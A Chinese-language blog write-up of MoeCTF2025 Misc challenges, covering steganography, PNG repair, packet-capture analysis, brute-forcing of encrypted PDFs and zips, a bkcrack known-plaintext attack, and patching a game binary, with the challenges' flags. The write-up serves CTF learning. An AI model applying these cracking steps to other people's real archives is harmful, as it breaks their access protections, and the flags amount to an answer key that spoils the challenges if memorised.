<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="MoeCTF2025_Misc_wp, Sa1ntCHENの小窝">
    <meta name="description" content="MoeCTF2025_Misc_wp

工具大赛罢了

环境配置

操作系统：Windows 11/Ubuntu 22.04 LTS
代码环境：python
乱七八糟的工具，写一题找一个

Misc入门指北

欢迎来">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>MoeCTF2025_Misc_wp | Sa1ntCHENの小窝</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    
    <style>
        body{
            background-image: url(/medias/bg.jpg);
            background-repeat: no-repeat;
            background-size: 100% 100%;
            background-attachment: fixed;
            background-position: center center;
        }
    </style>


    
    <!-- bg-cover style     -->



        <link rel="stylesheet" type="text/css"
            href="/libs/awesome/css/all.min.css">
        <link rel="stylesheet" type="text/css"
            href="/libs/materialize/materialize.min.css">
        <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
        <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
        <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/lightgallery/1.10.0/css/lightgallery.css">
        <link rel="stylesheet" type="text/css" href="/css/matery.css">
        <link rel="stylesheet" type="text/css" href="/css/my.css">
        <link rel="stylesheet" type="text/css" href="/css/dark.css"
            media="none" onload="if(media!='all')media='all'">

        


    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">



            
    
        <link rel="stylesheet" type="text/css" href="/css/reward.css">
    


    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 8.0.0"><link rel="alternate" href="/atom.xml" title="Sa1ntCHENの小窝" type="application/atom+xml">
</head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">Sa1ntCHENの小窝</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">Sa1ntCHENの小窝</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/SaintCEN" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #1976D2;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/SaintCEN" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    

<div class="bg-cover pd-header post-cover">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">MoeCTF2025_Misc_wp</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/CTF/">
                                <span class="chip bg-color">CTF</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E7%AC%94%E8%AE%B0/" class="post-category">
                                笔记
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2025-10-13
                </div>
                

                

                

                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.min.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="moectf2025_misc_wp">MoeCTF2025_Misc_wp</h1>
<blockquote>
<p>工具大赛罢了</p>
</blockquote>
<h2 id="环境配置">环境配置</h2>
<ul>
<li><strong>操作系统</strong>：<code>Windows 11</code>/<code>Ubuntu 22.04 LTS</code></li>
<li><strong>代码环境</strong>：<code>python</code></li>
<li><strong>乱七八糟的工具，写一题找一个</strong></li>
</ul>
<h2 id="misc入门指北">Misc入门指北</h2>
<blockquote>
<p>欢迎来到misc的世界^ _ ^</p>
</blockquote>
<p>打开PDF，查找<code>moectf</code>，复制隐藏的flag提交即可<strong>（注意拉到底）</strong>。</p>
<pre class="language-none"><code class="language-none">moectf&#123;We1c0m3_7o_tH3_w0R1d_0f_m1sc3111aN3ous!!&#125;</code></pre>
<h2 id="rush">Rush</h2>
<blockquote>
<p>“冲刺，冲刺！”你正走在路上，耳边传来这样的声音，还没反应过来，就被撞倒了。</p>
<p>你费劲地爬起来，好像看到了什么信息，回过神来那人早已扬长而去，那我缺的这个道歉这块？</p>
</blockquote>
<p>拿到<code>gif</code>发现二维码，截图。</p>
<p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc1.jpg"></p>
<p>用<code>CQR</code>打开直接发现了隐藏<code>flag</code>。</p>
<pre class="language-none"><code class="language-none">moectf&#123;QR_C0d3s_feATUR3_eRror_c0RRECt10N&#125;</code></pre>
<h2 id="ez_lsb">ez_LSB</h2>
<blockquote>
<p>这是一张普通的图片，但是一个个像素看过去似乎有些蹊跷？</p>
</blockquote>
<p>题目已经告诉我们是图片<code>LSB</code>隐写，我们用<code>zsteg</code>检测下，但<code>flag</code>形式没有意义。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">dzc@dzc-virtual-machine:~/zsteg$ zsteg xidian.png
b1,r,lsb,xy         <span class="token punctuation">..</span> text: <span class="token string">"The flag is: bW9lY3Rme0xTQl8xc19zMF8xbnQzcmVzdDFuZyEhc2o5d2R9"</span>
b1,rgb,lsb,xy       <span class="token punctuation">..</span> file: TeX font metric data <span class="token punctuation">(</span><span class="token punctuation">\</span>002H <span class="token punctuation">\</span>002<span class="token punctuation">)</span>
b1,rgba,msb,xy      <span class="token punctuation">..</span> file: OpenPGP Public Key
b2,bgr,msb,xy       <span class="token punctuation">..</span> file: Applesoft BASIC program data, first line number <span class="token number">128</span>
b3,bgr,msb,xy       <span class="token punctuation">..</span> file: Lotus unknown worksheet or configuration, revision 0x8
b4,r,lsb,xy         <span class="token punctuation">..</span> file: Targa image data - Map <span class="token punctuation">(</span><span class="token number">256</span>-4112<span class="token punctuation">)</span> <span class="token number">4096</span> x <span class="token number">65536</span> x <span class="token number">1</span> +4097 +257 - right <span class="token string">"<span class="token entity" title="\001">\001</span><span class="token entity" title="\020">\020</span><span class="token entity" title="\001">\001</span><span class="token entity" title="\020">\020</span><span class="token entity" title="\021">\021</span>"</span>
b4,bgr,lsb,xy       <span class="token punctuation">..</span> file: Targa image data - Map <span class="token number">65536</span> x <span class="token number">1</span> x <span class="token number">16</span> +1</code></pre>
<p>我们用<code>cyberchef</code>尝试<code>base64</code>解码得到<code>flag</code>。</p>
<pre class="language-none"><code class="language-none">moectf&#123;LSB_1s_s0_1nt3rest1ng!!sj9wd&#125;</code></pre>
<h2 id="ez_锟斤拷">ez_锟斤拷????</h2>
<blockquote>
<p>E=hv在记事本里写下了一些神秘字符，</p>
<p>但是经过一通保存另存为的迷之操作之后文本文件里的东西全变成了乱码</p>
</blockquote>
<p>拿到了<code>flag.txt</code>文件，<code>UTF-8</code>错误由<code>GBK</code>解码所致，需要对此乱码（锟斤拷）进行处理。</p>
<pre class="language-python" data-language="python"><code class="language-python">garbled_text <span class="token operator">=</span> <span class="token string">"锝嶏綇锝咃絻锝旓絾锝涳讥锝庯迹锛愶絼锛戯綁锝庯絿锛匡絿锝傦极锛匡紶锝庯激锛匡嫉锝旓絾锛匡紭锛匡紤锝擄伎锛旓綍锝庯紒锛侊絽锝楋綏锝楋綏锝濇伃鍠滀綘寰楀埌寮楁媺鏍煎悗闈㈠叏鏄敓鏂ゆ嫹閿熸枻鎷烽敓鏂ゆ嫹"</span>
<span class="token comment"># 1.用 GBK 编码</span>
gbk_bytes <span class="token operator">=</span> garbled_text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'gbk'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'replace'</span><span class="token punctuation">)</span> <span class="token comment"># 替换无法编码的字符</span>
<span class="token comment"># 2.用 UTF-8 解码</span>
original_text <span class="token operator">=</span> gbk_bytes<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span>
<span class="token comment"># 3.转成半角</span>
<span class="token keyword">import</span> unicodedata
<span class="token keyword">def</span> <span class="token function">full_to_half</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>
        unicodedata<span class="token punctuation">.</span>normalize<span class="token punctuation">(</span><span class="token string">'NFKC'</span><span class="token punctuation">,</span> char<span class="token punctuation">)</span>  <span class="token comment"># NFKC 标准化转换全角→半角</span>
        <span class="token keyword">for</span> char <span class="token keyword">in</span> text
    <span class="token punctuation">)</span>
flag <span class="token operator">=</span> full_to_half<span class="token punctuation">(</span>original_text<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> </code></pre>
<p>得到了输出</p>
<pre class="language-none"><code class="language-none">moectf&#123;EnC0d1ing_gbK_@nD_Utf_8_1s_4un!!ewwww&#125;恭喜你得到弗拉格后面全?斤拷锟斤拷锟斤拷</code></pre>
<p>不知道何意味。取前面的<code>flag</code>部分提交即可。</p>
<h2 id="weird_photo">weird_photo</h2>
<blockquote>
<p>FLAG就在图中。什么，你说你看不见 FLAG？注意 CRC！</p>
</blockquote>
<p>提示图片的CRC校验值可能有误，我们用<code>pngcheck</code>检查下。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">pngcheck <span class="token parameter variable">-v</span> photo.png 
File: photo.png <span class="token punctuation">(</span><span class="token number">829531</span> bytes<span class="token punctuation">)</span>
  chunk IHDR at offset 0x0000c, length <span class="token number">13</span>
    <span class="token number">900</span> x <span class="token number">490</span> image, <span class="token number">24</span>-bit RGB, non-interlaced 
  CRC error <span class="token keyword">in</span> chunk IHDR <span class="token punctuation">(</span>computed d34d176f, expected b5a7bf8c<span class="token punctuation">)</span>
ERRORS DETECTED <span class="token keyword">in</span> photo.png</code></pre>
<p>然后根据西电同学的经验，这个塔楼拍的不太完整，感觉是图片尺寸改掉了？我们用<code>010 Editor</code>编辑下。</p>
<p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc3.jpg"></p>
<p>搜索<code>b5a7bf8c</code>的位置，改成<code>d34d176f</code>（位置就在IHDR块数据开始的地方）。尺寸<code>384</code>和<code>1EA</code>用十六进制计算就是<code>900</code>和<code>490</code>，我们把高度<code>1EA</code>也改成<code>384</code>看看能不能显示<code>flag</code>。</p>
<p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc4.jpg"></p>
<pre class="language-none"><code class="language-none">moectf&#123;Image_Height_Restored&#125;</code></pre>
<h2 id="sstv">SSTV</h2>
<blockquote>
<p>识别并解码附件中使用的特殊通信协议，以获取隐藏信息。</p>
</blockquote>
<p>已经提示了我们<code>SSTV</code>编码，我们使用<code>RX-SSTV</code>工具，配置虚拟声卡，播放<code>sstv.wav</code>即可。</p>
<p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc5.jpg"></p>
<pre class="language-none"><code class="language-none">moectf&#123;d3codiNG_SStV-reQu1REs-PATI3nC3&#125;</code></pre>
<h2 id="encrypted_pdf">encrypted_pdf</h2>
<blockquote>
<p>I am so forgetful… So I will use a password that is simple
enough.</p>
</blockquote>
<p>加密的PDF，密码足够简单，爆破即可，我用的是在线网站<code>I Love PDF</code>。</p>
<p>解密后打开PDF，隐藏方式和入门指北一样，查找<code>moectf</code>。</p>
<pre class="language-none"><code class="language-none">moectf&#123;Pdf_1s_r3a1ly_c0lor4ul!!ihdw&#125;</code></pre>
<p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc2.jpg"></p>
<p><strong>啊啊啊啊啊啊啊啊啊啊啊SEC娘宝宝可爱捏~</strong></p>
<h2 id="捂住一只耳">捂住一只耳</h2>
<blockquote>
<p>一只手捂住耳朵 另一只手打开音乐 似乎听到了不一样的声音</p>
</blockquote>
<p>明显在暗示单声道与立体声，我们用<code>Audacity</code>工具观察并且分离出上方的声道。</p>
<p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc6.jpg"></p>
<p>像是有规律的声音，听了一下好像是<code>moise</code>密码，我们用在线网站解码一下就得到<code>flag</code>。</p>
<pre class="language-none"><code class="language-none">moectf&#123;HALF_RADIO_IN_XDU&#125;</code></pre>
<p><strong>我已经很久没有听到过半部电台的故事了…</strong></p>
<h2 id="enchantment">Enchantment</h2>
<blockquote>
<p>哇多么好的附魔啊</p>
<p>你把图片发了出去，但似乎附魔台上的文字有一些不对劲？</p>
</blockquote>
<p>得到了一个<code>pngpca</code>文件，我们用<code>wireshark</code>作流量分析。</p>
<p>用<code>http</code>过滤，发现了<code>post</code>方法上传的<code>enchantment.png</code>文件，我们导出分组字节流保存文件为<code>png</code>格式。</p>
<p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc7.jpg"></p>
<p>这是<code>minecraft</code>里的附魔台文字，我们去网上找一下换算图，一个个对过来就得到<code>flag</code>。</p>
<pre class="language-none"><code class="language-none">moectf&#123;now_you_have_mastered_enchanting&#125;</code></pre>
<h2 id="webrepo">WebRepo</h2>
<blockquote>
<p>这都是什么稀奇古怪的格式！？</p>
</blockquote>
<p>直译一下是“网络上的仓库”，但是得到了一个<code>webp</code>文件，好一个一语双关。</p>
<p>扫描二维码告诉我们用<code>binwalk</code>，检查了一下发现是<code>.rar</code>文件，解压出发现了隐藏的<code>.git</code>文件夹，和题目对上了，是个仓库（太对了，真是<code>WebRepo</code>），<code>flag</code>一定藏在提交信息中。</p>
<p>在该目录下打开终端输入<code>git show</code>，得到<code>flag</code>。</p>
<pre class="language-none"><code class="language-none">moectf&#123;B1NwA1K_ANd_g1t_R3seT-MaG1C&#125;</code></pre>
<h2 id="ez_ssl">ez_ssl</h2>
<blockquote>
<p>zero6six
在网页内上传了一份秘密文件。望着浏览器提示的“连接安全，信息不会外泄”，他觉得万无一失。</p>
<p>但与此同时，他的浏览器却悄悄上传了另一份文件。现在把他电脑的抓包记录给你，你能破解他的秘密吗？</p>
</blockquote>
<p>得到了一个<code>pngpca</code>文件，我们用<code>wireshark</code>工具作流量分析。题目提示有“秘密文件”和“另一份文件”，我们应该要把两个都找到。</p>
<p><code>http</code>过滤查看<code>post</code>方法上传的文件，发现是<code>ssl.log</code>日志文件；而<code>html</code>文件显示进行了文件上传操作。</p>
<p>查了一下和<code>TLS</code>有关，配置<code>ssl.log</code>文件后发现了<code>http</code>过滤后的信息变多，有一个<code>zip</code>文件，我们把文件导出，发现里面存在<code>flag.txt</code>。</p>
<p>然！后！我就一直以为<code>ssl.log</code>或者其他地方藏了密码，用各种方式去试都不行……最后发现压缩包写了密码是<code>7</code>位纯数字。用工具<code>ARCHPR</code>直接爆破。</p>
<p>得到密码：<code>6921682</code>，解压压缩包得到<code>Ook</code>编码，找个在线网站解码一下得到<code>flag</code>。</p>
<pre class="language-none"><code class="language-none">moectf&#123;upI0@d-l0G_TO-DeCrYPT_uploAD&#125;</code></pre>
<h2 id="ez_png">ez_png</h2>
<blockquote>
<p>这张平平无奇的图片里藏着一个小秘密。秘密不在颜色中，而在文件的骨骼里。注意：某些数据段的长短似乎不太协调。</p>
</blockquote>
<p>对于图片结构，我们可以使用工具<code>pngcheck</code>。</p>
<pre class="language-none"><code class="language-none">File: ez_png.png (899069 bytes)
  chunk IHDR at offset 0x0000c, length 13
    900 x 600 image, 24-bit RGB, non-interlaced
  chunk pHYs at offset 0x00025, length 9: 2835x2835 pixels&#x2F;meter (72 dpi)
  chunk IDAT at offset 0x0003a, length 65524
    zlib: deflated, 32K window, default compression
  chunk IDAT at offset 0x1003a, length 65524
  chunk IDAT at offset 0x2003a, length 65524
  chunk IDAT at offset 0x3003a, length 65524
  chunk IDAT at offset 0x4003a, length 65524
  chunk IDAT at offset 0x5003a, length 65524
  chunk IDAT at offset 0x6003a, length 65524
  chunk IDAT at offset 0x7003a, length 65524
  chunk IDAT at offset 0x8003a, length 65524
  chunk IDAT at offset 0x9003a, length 65524
  chunk IDAT at offset 0xa003a, length 65524
  chunk IDAT at offset 0xb003a, length 65524
  chunk IDAT at offset 0xc003a, length 65524
  chunk IDAT at offset 0xd003a, length 46973
  chunk IDAT at offset 0xdb7c3, length 38
  chunk IEND at offset 0xdb7f5, length 0
No errors detected in ez_png.png (18 chunks, 44.5% compression).</code></pre>
<p>发现有数据块不正常，用<code>binwalk</code>检查一下，直接拆出来了<code>zlib</code>文件，点开就得到了<code>flag</code>。</p>
<pre class="language-none"><code class="language-none">moectf&#123;h1DdEn_P4YlOaD_IN-Id4T&#125;</code></pre>
<h2 id="万里挑一">万里挑一</h2>
<blockquote>
<p>要想冲破封锁，寻得真谛，须从万把钥匙中找出唯一的答案</p>
</blockquote>
<p>递归解压脚本，并把所有密码写入<code>txt</code>（最后手动处理一下多余的提示）。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile
<span class="token keyword">import</span> tempfile
<span class="token keyword">import</span> os

<span class="token keyword">def</span> <span class="token function">extract_zips</span><span class="token punctuation">(</span>zip_path<span class="token punctuation">,</span> output_file<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> tempfile<span class="token punctuation">.</span>TemporaryDirectory<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> temp_dir<span class="token punctuation">:</span>
        <span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>zip_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> zip_ref<span class="token punctuation">:</span>
            zip_ref<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>temp_dir<span class="token punctuation">)</span>
            <span class="token keyword">for</span> item <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>temp_dir<span class="token punctuation">)</span><span class="token punctuation">:</span>
                item_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp_dir<span class="token punctuation">,</span> item<span class="token punctuation">)</span>
                <span class="token keyword">if</span> item<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'.txt'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>item_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> errors<span class="token operator">=</span><span class="token string">'ignore'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                        content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
                        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>output_file<span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> out_f<span class="token punctuation">:</span>
                            out_f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span>
                <span class="token keyword">elif</span> item<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">'.zip'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    extract_zips<span class="token punctuation">(</span>item_path<span class="token punctuation">,</span> output_file<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    zip_path <span class="token operator">=</span> <span class="token string">"password.zip"</span>
    output_file <span class="token operator">=</span> <span class="token string">"dic.txt"</span>
    extract_zips<span class="token punctuation">(</span>zip_path<span class="token punctuation">,</span> output_file<span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>然后用<code>ARCHPR</code>字典爆破，成功解压。</p>
<pre class="language-none"><code class="language-none">a296a5ec1385f394e8cb</code></pre>
<p>发现<code>明文.exe</code>和<code>flag.txt</code>，联想到<code>bkcrack</code>明文攻击（<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43007452/article/details/135607308">Bugku
CTF：请攻击这个压缩包[WriteUP]-CSDN博客</a>）</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"4d5a90000300000004000000ffff"</span> <span class="token operator">|</span> xxd <span class="token parameter variable">-r</span> <span class="token parameter variable">-p</span> <span class="token operator">></span> plain.bin
bkcrack <span class="token parameter variable">-C</span> flag.zip <span class="token parameter variable">-c</span> <span class="token string">"明文.exe"</span> <span class="token parameter variable">-p</span> plain.bin <span class="token comment"># 得到key1 key2 key3</span>
bkcrack <span class="token parameter variable">-C</span> flag.zip <span class="token parameter variable">-k</span> eec878a3 6808e48f 3aa41bd8 <span class="token parameter variable">-U</span> new_flag.zip <span class="token number">123456</span> <span class="token comment"># 用新密码解密</span></code></pre>
<pre class="language-none"><code class="language-none">moectf&#123;Y0u_h4v3_cho5en_7h3_r1ght_z1pf1le!!uysdgfsad&#125;</code></pre>
<h2 id="encrypted_volume">Encrypted_Volume</h2>
<blockquote>
<p>找到钥匙，解开加密卷！</p>
</blockquote>
<p>用<code>01editor</code>打开，在最后一个文件块中找到了<code>PNG</code>，保留这一部分发现二维码，扫描找到密钥。</p>
<pre class="language-none"><code class="language-none">:@(s&lt;&quot;A3F:89x541Ux[&lt;</code></pre>
<p>用<code>veracrypt</code>挂载<code>Volume</code>文件，得到了<code>brainfuck</code>加密文件，解密一下即可。</p>
<pre class="language-none"><code class="language-none">moectf&#123;nOW_YoU-h4V3_UNlocKED-VOlumE&#125;</code></pre>
<h2 id="哈基米难没露躲">哈基米难没露躲</h2>
<blockquote>
<p>出题人哈基米音乐听多了(bushi</p>
</blockquote>
<p>看了半天，符号和词都有规律，<code>100pts</code>不至于自己解吧？我去网上搜了搜哈基米加密，还真有。</p>
<p>简直就是世界上最优美的加密啊。</p>
<p>https://lhlnb.top/hajimi/base64</p>
<p><img src="/2025/10/13/MoeCTF2025_Misc_wp/misc8.jpg"></p>
<p>提示隐写，发现有零宽字符，需要再解密。https://330k.github.io/misc_tools/unicode_steganography.html</p>
<pre class="language-none"><code class="language-none">moectf&#123;1b8956b9-a423-4101-a1bd-65be33682c82&#125;</code></pre>
<h2 id="master">2048_master</h2>
<blockquote>
<p>大家都是2048高手吧，出题人准备了一点小礼物哦，玩玩游戏就能拿到flag^ _
^</p>
</blockquote>
<p>游戏玩了下玩不出来，所以我选择<code>reverse</code>。</p>
<p>思路：找到比较 <code>&gt; 13</code>
的指令并修改成<code>&gt; 1</code>。</p>
<pre class="language-none"><code class="language-none">cmp eax, 0Dh # 改成01h</code></pre>
<p><code>IDA</code>中的操作是：1.修改：<code>Edit</code> →
<code>Patch program</code> →
<code>Assemble</code>，2.保存：<code>Edit</code> →
<code>Patch program</code> →
<code>Apply patches to input file</code>。运行修改后的<code>.exe</code>后就得到了<code>flag</code>。</p>
